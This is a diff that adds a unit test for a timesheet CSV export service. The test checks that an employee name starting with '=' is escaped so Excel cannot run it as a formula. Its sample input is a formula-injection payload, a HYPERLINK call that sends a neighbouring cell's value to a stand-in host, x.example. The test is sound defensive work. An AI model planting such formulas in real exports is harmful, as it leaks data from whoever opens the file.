@@ -419,6 +419,16 @@ describe('TimesheetExportService', () => {
       expect(buildTimesheetCsv(data)).toContain('"Late, Left early"');
     });
 
+    it('never lets a cell be read as a formula by Excel', async () => {
+      // The name somebody goes by is typed by them, and Excel runs a cell
+      // starting = + - @ as a formula when the file is opened.
+      const { service } = build([entry()]);
+      const data = await service.build({ ...period, columns: ['employee', 'hours'] });
+      data.rows[0].values.employee = '=HYPERLINK("http://x.example/"&C2,"Frankie")';
+      const row = buildTimesheetCsv(data).split('\r\n')[1];
+      expect(row).toBe(`"'=HYPERLINK(""http://x.example/""&C2,""Frankie"")",8`);
+    });
+
     it('writes the hours total as a number, not just a formula', async () => {
       const { service } = build([
         entry(),
